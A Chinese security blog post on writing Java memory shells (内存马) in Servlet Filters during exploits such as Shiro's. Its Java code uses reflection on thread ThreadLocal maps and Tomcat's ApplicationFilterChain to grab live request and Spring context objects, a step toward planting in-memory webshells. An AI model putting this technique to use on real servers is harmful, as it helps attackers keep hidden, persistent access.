---
date: 2022/4/13 21:00:00

---

# Filter中写内存马的误解

目前大家认为在shiro等Filter的漏洞利用中，无法从ApplicationFilterChain中获取request，本文纠正这一认知。

Spring RequestContextHolder获取context、ApplicationFilterChain获取request ，都为多线程ThreadLocal线程安全，Controller/Servlet访问结束后这些对象也被回收。

但即便在不同线程或不在其生命周期内，我们还是能获取这些对象。

该函数遍历所有线程的threadLocals字段，并查找其中的table，返回符合预期的实例对象

```java
 public static List<Object> getThreadLocalValue(Class targetClass,boolean isBreak){
        List<Object> objects = new ArrayList<>();
        try{
            Method getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Thread[] threads = (Thread[]) getThreads.invoke(null);
            for (Thread thread : threads) {
                try {
                    if (thread!=null) {
                        Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
                        threadLocalsField.setAccessible(true);
                        //ThreadLocalMap
                        Object threadLocals = threadLocalsField.get(thread);
                        Field tableField = Class.forName("java.lang.ThreadLocal$ThreadLocalMap").getDeclaredField("table");
                        tableField.setAccessible(true);
                        //hreadLocal.ThreadLocalMap.Entry[]
                        Object[]  table = (Object[])tableField.get(threadLocals);
                        for (Object entry : table) {
                            if (entry != null) {
                               // Field field = Class.forName("java.util.HashMap$Node").getDeclaredField("value");
                                Field field =
                                        Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry").getDeclaredField(
                                                "value");
                                field.setAccessible(true);
                                Object value = field.get(entry);
                                if (targetClass.isInstance(value) ) {
                                    objects.add(value);
                                    if (isBreak) {
                                        return objects;
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                }
            }
        }catch(Exception e){
        }
        return objects;
    }
```

spring mcv中，我们也能在任意地方获取到spring context

```java
		Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                List<Object> objects = getThreadLocalValue(ServletRequestAttributes.class,true);
                if (objects.size() > 0) {
                    RequestAttributes requestAttributes = (RequestAttributes) objects.get(0);
                    WebApplicationContext context = (WebApplicationContext)requestAttributes.getAttribute("org" +
                            ".springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
                    System.out.println(context);
                }
            }
        });
        t.start();
```

当代码执行在Filter中时，我们也能从ApplicationFilterChain获取request

```java
 @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try {
            Field WRAP_SAME_OBJECT = Class.forName("org.apache.catalina.core.ApplicationDispatcher")
                    .getDeclaredField("WRAP_SAME_OBJECT");
            nofinal(WRAP_SAME_OBJECT);
            //将静态布尔值设置为true
            WRAP_SAME_OBJECT.setBoolean(null, true);
            Class ApplicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field lastServicedRequest =ApplicationFilterChain.getDeclaredField("lastServicedRequest");
            nofinal(lastServicedRequest);
            if (lastServicedRequest.get(null) == null) {
                lastServicedRequest.set(null, new ThreadLocal<ServletRequest>());
            }
            Field lastServicedResponse = ApplicationFilterChain.getDeclaredField("lastServicedResponse");
            nofinal(lastServicedResponse);
            if (lastServicedResponse.get(null) == null) {
                lastServicedResponse.set(null, new ThreadLocal<ServletRequest>());
            }

            HttpServletRequest request = (HttpServletRequest) servletRequest;
            if (lastServicedRequest.get(null) != null && request.getParameter("test")!=null) {
                while (true) {
                    List<Object> objects = getThreadLocalValue(ServletRequest.class, true);
                    if (objects.size() > 0) {
                        //org.apache.catalina.connector.RequestFacade@5a349d46
                        System.out.println(objects.get(0));
                        break;
                    }
                }
            }
            } catch (Exception e) {
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }
```

